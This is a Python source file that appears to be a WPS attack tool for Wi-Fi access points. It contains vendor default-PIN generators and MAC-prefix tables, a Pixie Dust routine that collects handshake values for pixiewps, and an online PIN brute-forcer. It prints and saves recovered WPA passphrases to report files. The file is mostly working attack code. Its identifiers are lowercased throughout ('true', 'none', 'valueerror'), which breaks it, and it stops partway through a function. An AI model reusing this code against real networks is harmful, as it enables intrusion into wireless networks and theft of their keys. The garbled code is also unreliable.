#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
from datetime import datetime
import collections
import statistics
import csv
from typing import dict


class networkaddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise valueerror('mac address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer += other

    def __isub__(self, other):
        self.integer -= other

    def __eq__(self, other):
        return self.integer == other.integer

    def __ne__(self, other):
        return self.integer != other.integer

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return mac

    def __repr__(self):
        return 'networkaddress(string={}, integer={})'.format(
            self._str_repr, self._int_repr)


class wpspin:
    """wps pin generator"""
    def __init__(self):
        self.algo_mac = 0
        self.algo_empty = 1
        self.algo_static = 2

        self.algos = {'pin24': {'name': '24-bit pin', 'mode': self.algo_mac, 'gen': self.pin24},
                      'pin28': {'name': '28-bit pin', 'mode': self.algo_mac, 'gen': self.pin28},
                      'pin32': {'name': '32-bit pin', 'mode': self.algo_mac, 'gen': self.pin32},
                      'pindlink': {'name': 'd-link pin', 'mode': self.algo_mac, 'gen': self.pindlink},
                      'pindlink1': {'name': 'd-link pin +1', 'mode': self.algo_mac, 'gen': self.pindlink1},
                      'pinasus': {'name': 'asus pin', 'mode': self.algo_mac, 'gen': self.pinasus},
                      'pinairocon': {'name': 'airocon realtek', 'mode': self.algo_mac, 'gen': self.pinairocon},
                      # static pin algos
                      'pinempty': {'name': 'empty pin', 'mode': self.algo_empty, 'gen': lambda mac: ''},
                      'pincisco': {'name': 'cisco', 'mode': self.algo_static, 'gen': lambda mac: 1234567},
                      'pinbrcm1': {'name': 'broadcom 1', 'mode': self.algo_static, 'gen': lambda mac: 2017252},
                      'pinbrcm2': {'name': 'broadcom 2', 'mode': self.algo_static, 'gen': lambda mac: 4626484},
                      'pinbrcm3': {'name': 'broadcom 3', 'mode': self.algo_static, 'gen': lambda mac: 7622990},
                      'pinbrcm4': {'name': 'broadcom 4', 'mode': self.algo_static, 'gen': lambda mac: 6232714},
                      'pinbrcm5': {'name': 'broadcom 5', 'mode': self.algo_static, 'gen': lambda mac: 1086411},
                      'pinbrcm6': {'name': 'broadcom 6', 'mode': self.algo_static, 'gen': lambda mac: 3195719},
                      'pinairc1': {'name': 'airocon 1', 'mode': self.algo_static, 'gen': lambda mac: 3043203},
                      'pinairc2': {'name': 'airocon 2', 'mode': self.algo_static, 'gen': lambda mac: 7141225},
                      'pindsl2740r': {'name': 'dsl-2740r', 'mode': self.algo_static, 'gen': lambda mac: 6817554},
                      'pinrealtek1': {'name': 'realtek 1', 'mode': self.algo_static, 'gen': lambda mac: 9566146},
                      'pinrealtek2': {'name': 'realtek 2', 'mode': self.algo_static, 'gen': lambda mac: 9571911},
                      'pinrealtek3': {'name': 'realtek 3', 'mode': self.algo_static, 'gen': lambda mac: 4856371},
                      'pinupvel': {'name': 'upvel', 'mode': self.algo_static, 'gen': lambda mac: 2085483},
                      'pinur814ac': {'name': 'ur-814ac', 'mode': self.algo_static, 'gen': lambda mac: 4397768},
                      'pinur825ac': {'name': 'ur-825ac', 'mode': self.algo_static, 'gen': lambda mac: 529417},
                      'pinonlime': {'name': 'onlime', 'mode': self.algo_static, 'gen': lambda mac: 9995604},
                      'pinedimax': {'name': 'edimax', 'mode': self.algo_static, 'gen': lambda mac: 3561153},
                      'pinthomson': {'name': 'thomson', 'mode': self.algo_static, 'gen': lambda mac: 6795814},
                      'pinhg532x': {'name': 'hg532x', 'mode': self.algo_static, 'gen': lambda mac: 3425928},
                      'pinh108l': {'name': 'h108l', 'mode': self.algo_static, 'gen': lambda mac: 9422988},
                      'pinono': {'name': 'cbn ono', 'mode': self.algo_static, 'gen': lambda mac: 9575521}}

    @staticmethod
    def checksum(pin):
        """
        standard wps checksum algorithm.
        @pin — a 7 digit pin to calculate the checksum for.
        returns the checksum value.
        """
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        """
        wps pin generator
        @algo — the wps pin algorithm id
        returns the wps pin string value
        """
        mac = networkaddress(mac)
        if algo not in self.algos:
            raise valueerror('invalid wps pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinempty':
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getall(self, mac, get_static=true):
        """
        get all wps pin's for single mac
        """
        res = []
        for id, algo in self.algos.items():
            if algo['mode'] == self.algo_static and not get_static:
                continue
            item = {}
            item['id'] = id
            if algo['mode'] == self.algo_static:
                item['name'] = 'static pin — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(id, mac)
            res.append(item)
        return res

    def getlist(self, mac, get_static=true):
        """
        get all wps pin's for single mac as list
        """
        res = []
        for id, algo in self.algos.items():
            if algo['mode'] == self.algo_static and not get_static:
                continue
            res.append(self.generate(id, mac))
        return res

    def getsuggested(self, mac):
        """
        get all suggested wps pin's for single mac
        """
        algos = self._suggest(mac)
        res = []
        for id in algos:
            algo = self.algos[id]
            item = {}
            item['id'] = id
            if algo['mode'] == self.algo_static:
                item['name'] = 'static pin — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(id, mac)
            res.append(item)
        return res

    def getsuggestedlist(self, mac):
        """
        get all suggested wps pin's for single mac as list
        """
        algos = self._suggest(mac)
        res = []
        for algo in algos:
            res.append(self.generate(algo, mac))
        return res

    def getlikely(self, mac):
        res = self.getsuggestedlist(mac)
        if res:
            return res[0]
        else:
            return none

    def _suggest(self, mac):
        """
        get algos suggestions for single mac
        returns the algo id
        """
        mac = mac.replace(':', '').upper()
        algorithms = {
            'pin24': ('04bf6d', '0e5d4e', '107bef', '14a9e3', '28285d', '2a285d', '32b2dc', '381766', '404a03', '4e5d4e', '5067f0', '5cf4ab', '6a285d', '8e5d4e', 'aa285d', 'b0b2dc', 'c86c87', 'cc5d4e', 'ce5d4e', 'ea285d', 'e243f6', 'ec43f6', 'ee43f6', 'f2b2dc', 'fcf528', 'fef528', '4c9eff', '0014d1', 'd8eb97', '1c7ee5', '84c9b2', 'fc7516', '14d64d', '9094e4', 'bcf685', 'c4a81d', '00664b', '087a4c', '14b968', '2008ed', '346bd3', '4cedde', '786a89', '88e3ab', 'd46e5c', 'e8cd2d', 'ec233d', 'eccb30', 'f49ff3', '20cf30', '90e6ba', 'e0cb4e', 'd4bf7f4', 'f8c091', '001cdf', '002275', '08863b', '00b00c', '081075', 'c83a35', '0022f7', '001f1f', '00265b', '68b6cf', '788df7', 'bc1401', '202bc1', '308730', '5c4ca9', '62233d', '623ce4', '623dff', '6253d4', '62559c', '626bd3', '627d5e', '6296bf', '62a8e4', '62b686', '62c06f', '62c61f', '62c714', '62cba8', '62cdbe', '62e87b', '6416f0', '6a1d67', '6a233d', '6a3dff', '6a53d4', '6a559c', '6a6bd3', '6a96bf', '6a7d5e', '6aa8e4', '6ac06f', '6ac61f', '6ac714', '6acba8', '6acdbe', '6ad15e', '6ad167', '721d67', '72233d', '723ce4', '723dff', '7253d4', '72559c', '726bd3', '727d5e', '7296bf', '72a8e4', '72c06f', '72c61f', '72c714', '72cba8', '72cdbe', '72d15e', '72e87b', '0026ce', '9897d1', 'e04136', 'b246fc', 'e24136', '00e020', '5ca39d', 'd86ce9', 'dc7144', '801f02', 'e47cf9', '000cf6', '00a026', 'a0f3c1', '647002', 'b0487a', 'f81a67', 'f8d111', '34ba9a', 'b4944e'),
            'pin28': ('200bc7', '4846fb', 'd46aa8', 'f84abf'),
            'pin32': ('000726', 'd8fee3', 'fc8b97', '1062eb', '1c5f2b', '48ee0c', '802689', '908d78', 'e8cc18', '2cab25', '10bf48', '14dae9', '3085a9', '50465d', '5404a6', 'c86000', 'f46d04', '3085a9', '801f02'),
            'pindlink': ('14d64d', '1c7ee5', '28107b', '84c9b2', 'a0ab1b', 'b8a386', 'c0a0bb', 'ccb255', 'fc7516', '0014d1', 'd8eb97'),
            'pindlink1': ('0018e7', '00195b', '001cf0', '001e58', '002191', '0022b0', '002401', '00265a', '14d64d', '1c7ee5', '340804', '5cd998', '84c9b2', 'b8a386', 'c8be19', 'c8d3a3', 'ccb255', '0014d1'),
            'pinasus': ('049226', '04d9f5', '08606e', '0862669', '107b44', '10bf48', '10c37b', '14dda9', '1c872c', '1cb72c', '2c56dc', '2cfda1', '305a3a', '382c4a', '38d547', '40167e', '50465d', '54a050', '6045cb', '60a44c', '704d7b', '74d02b', '7824af', '88d7f6', '9c5c8e', 'ac220b', 'ac9e17', 'b06ebf', 'bcee7b', 'c860007', 'd017c2', 'd850e6', 'e03f49', 'f0795978', 'f832e4', '00072624', '0008a1d3', '00177c', '001ea6', '00304fb', '00e04c0', '048d38', '081077', '081078', '081079', '083e5d', '10feed3c', '181e78', '1c4419', '2420c7', '247f20', '2cab25', '3085a98c', '3c1e04', '40f201', '44e9dd', '48ee0c', '5464d9', '54b80a', '587be906', '60d1aa21', '64517e', '64d954', '6c198f', '6c7220', '6cfdb9', '78d99fd', '7c2664', '803f5df6', '84a423', '88a6c6', '8c10d4', '8c882b00', '904d4a', '907282', '90f65290', '94fbb2', 'a01b29', 'a0f3c1e', 'a8f7e00', 'aca213', 'b85510', 'b8ee0e', 'bc3400', 'bc9680', 'c891f9', 'd00ed90', 'd084b0', 'd8fee3', 'e4beed', 'e894f6f6', 'ec1a5971', 'ec4c4d', 'f42853', 'f43e61', 'f46bef', 'f8ab05', 'fc8b97', '7062b8', '78542e', 'c0a0bb8c', 'c412f5', 'c4a81d', 'e8cc18', 'ec2280', 'f8e903f4'),
            'pinairocon': ('0007262f', '000b2b4a', '000ef4e7', '001333b', '00177c', '001aef', '00e04bb3', '02101801', '0810734', '08107710', '1013ee0', '2cab25c7', '788c54', '803f5df6', '94fbb2', 'bc9680', 'f43e61', 'fc8b97'),
            'pinempty': ('e46f13', 'ec2280', '58d56e', '1062eb', '10bef5', '1c5f2b', '802689', 'a0ab1b', '74dada', '9cd643', '68a0f6', '0c96bf', '20f3a3', 'ace215', 'c8d15e', '000e8f', 'd42122', '3c9872', '788102', '7894b4', 'd460e3', 'e06066', '004a77', '2c957f', '64136c', '74a78e', '88d274', '702e22', '74b57e', '789682', '7c3953', '8c68c8', 'd476ea', '344dea', '38d82f', '54be53', '709f2d', '94a7b7', '981333', 'caa366', 'd0608c'),
            'pincisco': ('001a2b', '00248c', '002618', '344deb', '7071bc', 'e06995', 'e0cb4e', '7054f5'),
            'pinbrcm1': ('acf1df', 'bcf685', 'c8d3a3', '988b5d', '001aa9', '14144b', 'ec6264'),
            'pinbrcm2': ('14d64d', '1c7ee5', '28107b', '84c9b2', 'b8a386', 'bcf685', 'c8be19'),
            'pinbrcm3': ('14d64d', '1c7ee5', '28107b', 'b8a386', 'bcf685', 'c8be19', '7c034c'),
            'pinbrcm4': ('14d64d', '1c7ee5', '28107b', '84c9b2', 'b8a386', 'bcf685', 'c8be19', 'c8d3a3', 'ccb255', 'fc7516', '204e7f', '4c17eb', '18622c', '7c03d8', 'd86ce9'),
            'pinbrcm5': ('14d64d', '1c7ee5', '28107b', '84c9b2', 'b8a386', 'bcf685', 'c8be19', 'c8d3a3', 'ccb255', 'fc7516', '204e7f', '4c17eb', '18622c', '7c03d8', 'd86ce9'),
            'pinbrcm6': ('14d64d', '1c7ee5', '28107b', '84c9b2', 'b8a386', 'bcf685', 'c8be19', 'c8d3a3', 'ccb255', 'fc7516', '204e7f', '4c17eb', '18622c', '7c03d8', 'd86ce9'),
            'pinairc1': ('181e78', '40f201', '44e9dd', 'd084b0'),
            'pinairc2': ('84a423', '8c10d4', '88a6c6'),
            'pindsl2740r': ('00265a', '1cbdb9', '340804', '5cd998', '84c9b2', 'fc7516'),
            'pinrealtek1': ('0014d1', '000c42', '000ee8'),
            'pinrealtek2': ('007263', 'e4beed'),
            'pinrealtek3': ('08c6b3',),
            'pinupvel': ('784476', 'd4bf7f0', 'f8c091'),
            'pinur814ac': ('d4bf7f60',),
            'pinur825ac': ('d4bf7f5',),
            'pinonlime': ('d4bf7f', 'f8c091', '144d67', '784476', '0014d1'),
            'pinedimax': ('801f02', '00e04c'),
            'pinthomson': ('002624', '4432c8', '88f7c7', 'cc03fa'),
            'pinhg532x': ('00664b', '086361', '087a4c', '0c96bf', '14b968', '2008ed', '2469a5', '346bd3', '786a89', '88e3ab', '9cc172', 'ace215', 'd07ab5', 'cca223', 'e8cd2d', 'f80113', 'f83dff'),
            'pinh108l': ('4c09b4', '4cac0a', '84742a4', '9cd24b', 'b075d5', 'c864c7', 'dc028e', 'fcc897'),
            'pinono': ('5c353b', 'dc537c')
        }
        res = []
        for algo_id, masks in algorithms.items():
            if mac.startswith(masks):
                res.append(algo_id)
        return res

    def pin24(self, mac):
        return mac.integer & 0xffffff

    def pin28(self, mac):
        return mac.integer & 0xfffffff

    def pin32(self, mac):
        return mac.integer % 0x100000000

    def pindlink(self, mac):
        # get the nic part
        nic = mac.integer & 0xffffff
        # calculating pin
        pin = nic ^ 0x55aa55
        pin ^= (((pin & 0xf) << 4) +
                ((pin & 0xf) << 8) +
                ((pin & 0xf) << 12) +
                ((pin & 0xf) << 16) +
                ((pin & 0xf) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pindlink1(self, mac):
        mac.integer += 1
        return self.pindlink(mac)

    def pinasus(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinairocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)
        return pin


def recvuntil(pipe, what):
    s = ''
    while true:
        inp = pipe.stdout.read(1)
        if inp == '':
            return s
        s += inp
        if what in s:
            return s


def get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()


class pixiewpsdata:
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return (self.pke and self.pkr and self.e_nonce and self.authkey
                and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range=false):
        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {}"\
                    " --e-hash2 {} --authkey {} --e-nonce {}".format(
                    self.pke, self.pkr, self.e_hash1,
                    self.e_hash2, self.authkey, self.e_nonce)
        if full_range:
            pixiecmd += ' --force'
        return pixiecmd


class connectionstatus:
    def __init__(self):
        self.status = ''   # must be wsc_nack, wps_fail or got_psk
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''

    def isfirsthalfvalid(self):
        return self.last_m_message > 5

    def clear(self):
        self.__init__()


class bruteforcestatus:
    def __init__(self):
        self.start_time = datetime.now().strftime("%y-%m-%d %h:%m:%s")
        self.mask = ''
        self.last_attempt_time = time.time()   # last pin attempt start time
        self.attempts_times = collections.deque(maxlen=15)

        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        average_pin_time = statistics.mean(self.attempts_times)
        if len(self.mask) == 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        print('[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
            percentage, self.start_time, average_pin_time))

    def registerattempt(self, mask):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self):
        self.__init__()


class companion:
    """main application part"""
    def __init__(self, interface, save_result=false, print_debug=false):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug

        self.tempdir = tempfile.mkdtemp()
        with tempfile.namedtemporaryfile(mode='w', suffix='.conf', delete=false) as temp:
            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.__init_wpa_supplicant()

        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
        self.retsock = socket.socket(socket.af_unix, socket.sock_dgram)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds = pixiewpsdata()
        self.connection_status = connectionstatus()

        user_home = str(pathlib.path.home())
        self.sessions_dir = f'{user_home}/.oneshot/sessions/'
        self.pixiewps_dir = f'{user_home}/.oneshot/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        if not os.path.exists(self.sessions_dir):
            os.makedirs(self.sessions_dir)
        if not os.path.exists(self.pixiewps_dir):
            os.makedirs(self.pixiewps_dir)

        self.generator = wpspin()

    def __init_wpa_supplicant(self):
        print('[*] running wpa_supplicant…')
        cmd = 'wpa_supplicant -k -d -dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
        self.wpas = subprocess.popen(cmd, shell=true, stdout=subprocess.pipe,
                                     stderr=subprocess.stdout, encoding='utf-8', errors='replace')
        # waiting for wpa_supplicant control interface initialization
        while not os.path.exists(self.wpas_ctrl_path):
            pass

    def sendonly(self, command):
        """sends command to wpa_supplicant"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendandreceive(self, command):
        """sends command to wpa_supplicant and returns the reply"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, address) = self.retsock.recvfrom(4096)
        inmsg = b.decode('utf-8', errors='replace')
        return inmsg

    def _explain_wpas_not_ok_status(command: str, respond: str):
        if command.startswith(('wps_reg', 'wps_pbc')):
            if respond == 'unknown command':
                return ('[!] it looks like your wpa_supplicant is compiled without wps protocol support. '
                        'please build wpa_supplicant with wps support ("config_wps=y")')
        return '[!] something went wrong — check out debug log'

    def __handle_wpas(self, pixiemode=false, pbc_mode=false, verbose=none):
        if not verbose:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return false
        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('wps: '):
            if 'building message m' in line:
                n = int(line.split('building message m')[1].replace('d', ''))
                self.connection_status.last_m_message = n
                print('[*] sending wps message m{}…'.format(n))
            elif 'received m' in line:
                n = int(line.split('received m')[1])
                self.connection_status.last_m_message = n
                print('[*] received wps message m{}'.format(n))
                if n == 5:
                    print('[+] the first half of the pin is valid')
            elif 'enrollee nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                assert(len(self.pixie_creds.e_nonce) == 16*2)
                if pixiemode:
                    print('[p] e-nonce: {}'.format(self.pixie_creds.e_nonce))
            elif 'dh own public key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                assert(len(self.pixie_creds.pkr) == 192*2)
                if pixiemode:
                    print('[p] pkr: {}'.format(self.pixie_creds.pkr))
            elif 'dh peer public key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                assert(len(self.pixie_creds.pke) == 192*2)
                if pixiemode:
                    print('[p] pke: {}'.format(self.pixie_creds.pke))
            elif 'authkey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                assert(len(self.pixie_creds.authkey) == 32*2)
                if pixiemode:
                    print('[p] authkey: {}'.format(self.pixie_creds.authkey))
            elif 'e-hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                assert(len(self.pixie_creds.e_hash1) == 32*2)
                if pixiemode:
                    print('[p] e-hash1: {}'.format(self.pixie_creds.e_hash1))
            elif 'e-hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                assert(len(self.pixie_creds.e_hash2) == 32*2)
                if pixiemode:
                    print('[p] e-hash2: {}'.format(self.pixie_creds.e_hash2))
            elif 'network key' in line and 'hexdump' in line:
                self.connection_status.status = 'got_psk'
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
        elif ': state: ' in line:
            if '-> scanning' in line:
                self.connection_status.status = 'scanning'
                print('[*] scanning…')
        elif ('wps-fail' in line) and (self.connection_status.status != ''):
            print(line)
            if 'msg=5 config_error=15' in line:
                print('[*] received wps-fail with reason: wps locked')
                self.connection_status.status = 'wps_fail'
            elif 'msg=8' in line:
                if 'config_error=15' in line:
                    print('[*] received wps-fail with reason: wps locked')
                    self.connection_status.status = 'wps_fail'
                else:    
                    self.connection_status.status = 'wsc_nack'
                    print('[-] error: pin was wrong')
            elif 'config_error=2' in line:
                print('[*] received wps-fail with reason: crc failure')
                self.connection_status.status = 'wps_fail'
            else:
                self.connection_status.status = 'wps_fail'
#        elif 'nl80211_cmd_del_station' in line:
#            print("[!] unexpected interference — kill networkmanager/wpa_supplicant!")
        elif 'trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'ssid' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print('[*] authenticating…')
        elif 'authentication response' in line:
            print('[+] authenticated')
        elif 'trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'ssid' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print('[*] associating with ap…')
        elif ('associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                print('[+] associated with {} (essid: {})'.format(bssid, self.connection_status.essid))
            else:
                print('[+] associated with {}'.format(bssid))
        elif 'eapol: txstart' in line:
            self.connection_status.status = 'eapol_start'
            print('[*] sending eapol start…')
        elif 'eap entering state identity' in line:
            print('[*] received identity request')
        elif 'using real identity' in line:
            print('[*] sending identity response…')
        elif pbc_mode and ('selected bss ' in line):
            bssid = line.split('selected bss ')[-1].split()[0].upper()
            self.connection_status.bssid = bssid
            print('[*] selected ap: {}'.format(bssid))

        return true

    def __runpixiewps(self, showcmd=false, full_range=false):
        print("[*] running pixiewps…")
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd:
            print(cmd)
        r = subprocess.run(cmd, shell=true, stdout=subprocess.pipe,
                           stderr=sys.stdout, encoding='utf-8', errors='replace')
        print(r.stdout)
        if r.returncode == 0:
            lines = r.stdout.splitlines()
            for line in lines:
                if ('[+]' in line) and ('wps pin' in line):
                    pin = line.split(':')[-1].strip()
                    if pin == '<empty>':
                        pin = "''"
                    return pin
        return false

    def __credentialprint(self, wps_pin=none, wpa_psk=none, essid=none):
        print(f"[+] wps pin: '{wps_pin}'")
        print(f"[+] wpa psk: '{wpa_psk}'")
        print(f"[+] ap ssid: '{essid}'")

    def __saveresult(self, bssid, essid, wps_pin, wpa_psk):
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)
        filename = self.reports_dir + 'stored'
        datestr = datetime.now().strftime("%d.%m.%y %h:%m")
        with open(filename + '.txt', 'a', encoding='utf-8') as file:
            file.write('{}\nbssid: {}\nessid: {}\nwps pin: {}\nwpa psk: {}\n\n'.format(
                        datestr, bssid, essid, wps_pin, wpa_psk
                    )
            )
        writetableheader = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
            csvwriter = csv.writer(file, delimiter=';', quoting=csv.quote_all)
            if writetableheader:
                csvwriter.writerow(['date', 'bssid', 'essid', 'wps pin', 'wpa psk'])
            csvwriter.writerow([datestr, bssid, essid, wps_pin, wpa_psk])
        print(f'[i] credentials saved to {filename}.txt, {filename}.csv')

    def __savepin(self, bssid, pin):
        filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
        with open(filename, 'w') as file:
            file.write(pin)
        print('[i] pin saved in {}'.format(filename))

    def __prompt_wpspin(self, bssid):
        pins = self.generator.getsuggested(bssid)
        if len(pins) > 1:
            print(f'pins generated for {bssid}:')
            print('{:<3} {:<10} {:<}'.format('#', 'pin', 'name'))
            for i, pin in enumerate(pins):
                number = '{})'.format(i + 1)
                line = '{:<3} {:<10} {:<}'.format(
                    number, pin['pin'], pin['name'])
                print(line)
            while 1:
                pinno = input('select the pin: ')
                try:
                    if int(pinno) in range(1, len(pins)+1):
                        pin = pins[int(pinno) - 1]['pin']
                    else:
                        raise indexerror
                except exception:
                    print('invalid number')
                else:
                    break
        elif len(pins) == 1:
            pin = pins[0]
            print('[i] the only probable pin is selected:', pin['name'])
            pin = pin['pin']
        else:
            return none
        return pin

    def __wps_connection(self, bssid=none, pin=none, pixiemode=false, pbc_mode=false, verbose=none):
        if not verbose:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        self.wpas.stdout.read(300)   # clean the pipe
        if pbc_mode:
            if bssid:
                print(f"[*] starting wps push button connection to {bssid}…")
                cmd = f'wps_pbc {bssid}'
            else:
                print("[*] starting wps push button connection…")
                cmd = 'wps_pbc'
        else:
            print(f"[*] trying pin '{pin}'…")
            cmd = f'wps_reg {bssid} {pin}'
        r = self.sendandreceive(cmd)
        if 'ok' not in r:
            self.connection_status.status = 'wps_fail'
            print(self._explain_wpas_not_ok_status(cmd, r))
            return false

        while true:
            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)
            if not res:
                break
            if self.connection_status.status == 'wsc_nack':
                break
            elif self.connection_status.status == 'got_psk':
                break
            elif self.connection_status.status == 'wps_fail':
                break

        self.sendonly('wps_cancel')
        return false

    def single_connection(self, bssid=none, pin=none, pixiemode=false, pbc_mode=false, showpixiecmd=false,
                          pixieforce=false, store_pin_on_fail=false):
        if not pin:
            if pixiemode:
                try:
                    # try using the previously calculated pin
                    filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                    with open(filename, 'r') as file:
                        t_pin = file.readline().strip()
                        if input('[?] use previously calculated pin {}? [n/y] '.format(t_pin)).lower() != 'n':
                            pin = t_pin
                        else:
                            raise filenotfounderror
                except filenotfounderror:
                    pin = self.generator.getlikely(bssid) or '12345670'
            elif not pbc_mode:
                # if not pixiemode, ask user to select a pin from the list
                pin = self.__prompt_wpspin(bssid) or '12345670'
        if pbc_mode:
            self.__wps_connection(bssid, pbc_mode=pbc_mode)
            bssid = self.connection_status.bssid
            pin = '<pbc mode>'
        elif store_pin_on_fail:
            try:
                self.__wps_connection(bssid, pin, pixiemode)
            except keyboardinterrupt:
                print("\naborting…")
                self.__savepin(bssid, pin)
                return false
        else:
            self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'got_psk':
            self.__credentialprint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
            if self.save_result:
                self.__saveresult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
            if not pbc_mode:
                # try to remove temporary pin file
                filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                try:
                    os.remove(filename)
                except filenotfounderror:
                    pass
            return true
        elif pixiemode:
            if self.pixie_creds.got_all():
                pin = self.__runpixiewps(showpixiecmd, pixieforce)
                if pin:
                    return self.single_connection(bssid, pin, pixiemode=false, store_pin_on_fail=true)
                return false
            else:
                print('[!] not enough data to run pixie dust attack')
                return false
        else:
            if store_pin_on_fail:
                # saving pixiewps calculated pin if can't connect
                self.__savepin(bssid, pin)
            return false

    def __first_half_bruteforce(self, bssid, f_half, delay=none):
        """
        @f_half — 4-character string
        """
        checksum = self.generator.checksum
        while int(f_half) < 10000:
            t = int(f_half + '000')
            pin = '{}000{}'.format(f_half, checksum(t))
            self.single_connection(bssid, pin)
            if self.connection_status.isfirsthalfvalid():
                print('[+] first half found')
                return f_half
            elif self.connection_status.status == 'wps_fail':
                print('[!] wps transaction failed, re-trying last pin')
                return self.__first_half_bruteforce(bssid, f_half)
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerattempt(f_half)
            if delay:
                time.sleep(delay)
        print('[-] first half not found')
        return false

    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=none):
        """
        @f_half — 4-character string
        @s_half — 3-character string
        """
        checksum = self.generator.checksum
        while int(s_half) < 1000:
            t = int(f_half + s_half)
            pin = '{}{}{}'.format(f_half, s_half, checksum(t))
            self.single_connection(bssid, pin)
            if self.connection_status.last_m_message > 6:
                return pin
            elif self.connection_status.status == 'wps_fail':
                print('[!] wps transaction failed, re-trying last pin')
